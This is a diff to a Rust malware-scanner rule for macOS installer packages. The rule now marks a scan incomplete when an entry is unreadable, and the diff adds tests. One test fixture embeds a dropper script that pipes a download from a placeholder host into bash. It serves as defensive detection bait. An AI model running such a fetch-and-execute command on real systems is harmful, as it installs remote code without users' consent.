@@ -57,22 +57,32 @@ impl Rule for InstallerScriptRule {
         }
 
         let mut findings = ScriptFindings::default();
+        let mut unreadable = false;
 
         for entry in archive.metadata_entries() {
-            match entry.name.as_str() {
+            let result = match entry.name.as_str() {
                 "Scripts" => {
-                    scan_scripts_entry(ctx, content, &archive, entry, &limits, &mut findings)?;
+                    scan_scripts_entry(ctx, content, &archive, entry, &limits, &mut findings)
                 }
                 "Distribution" => {
-                    scan_distribution_entry(ctx, content, &archive, entry, &limits, &mut findings)?;
+                    scan_distribution_entry(ctx, content, &archive, entry, &limits, &mut findings)
                 }
                 _ => continue,
-            }
+            };
+            unreadable |= result.is_err();
         }
 
-        // Nothing scanned, or scanned and scored nothing: a clean read.
+        // Nothing scored: clean only if every entry was actually read.
         if findings.descriptions.is_empty() || findings.total <= 0 {
-            return Ok(None);
+            return if unreadable {
+                Err(RuleOutcome::NotApplicable)
+            } else {
+                Ok(None)
+            };
+        }
+        // A finding outranks the gap, but the gap is still reported (§11.8).
+        if unreadable {
+            ctx.mark_incomplete(self.id());
         }
 
         Ok(Some(MatchedSignal {
@@ -677,6 +687,65 @@ mod tests {
             InstallerScriptRule.evaluate(&c),
             Err(RuleOutcome::NotApplicable)
         ));
+    }
+
+    /// A product-style xar with a readable dropper `Distribution` and a
+    /// `Scripts` entry whose bytes are not a cpio archive, in either TOC order.
+    fn dropper_with_garbage_scripts(scripts_first: bool) -> Vec<u8> {
+        let dist = br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");</script></a>"#;
+        let garbage = b"not a gzip or cpio archive at all";
+        let entry = |id: u32, name: &str, off: usize, len: usize| {
+            format!(
+                r#"<file id="{id}"><name>{name}</name><type>file</type><data><offset>{off}</offset><length>{len}</length><size>{len}</size><encoding style="application/octet-stream"/></data></file>"#
+            )
+        };
+        let (d_off, s_off) = if scripts_first {
+            (garbage.len(), 0)
+        } else {
+            (0, dist.len())
+        };
+        let d = entry(1, "Distribution", d_off, dist.len());
+        let s = entry(2, "Scripts", s_off, garbage.len());
+        let toc = if scripts_first { s + &d } else { d + &s };
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        if scripts_first {
+            bytes.extend_from_slice(garbage);
+            bytes.extend_from_slice(dist);
+        } else {
+            bytes.extend_from_slice(dist);
+            bytes.extend_from_slice(garbage);
+        }
+        bytes
+    }
+
+    #[test]
+    fn a_finding_survives_an_unreadable_sibling_entry_and_marks_incomplete() {
+        for scripts_first in [false, true] {
+            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
+            let signal = InstallerScriptRule
+                .evaluate(&c)
+                .expect("evaluates")
+                .expect("the readable Distribution still scores");
+            assert!(
+                signal.description.starts_with("distribution script:"),
+                "{}",
+                signal.description
+            );
+            assert!(c.marked_incomplete("installer-script-suspicious"));
+
+            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
+            let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
+            let r = crate::scan::scan_context(&c, &rules);
+            assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
+            assert_eq!(r.signals.len(), 1);
+        }
+    }
+
+    #[test]
+    fn a_clean_read_does_not_mark_incomplete() {
+        let c = ctx("d.pkg", pkg!("distribution_dropper"));
+        let _ = InstallerScriptRule.evaluate(&c);
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
     }
 
     #[test]
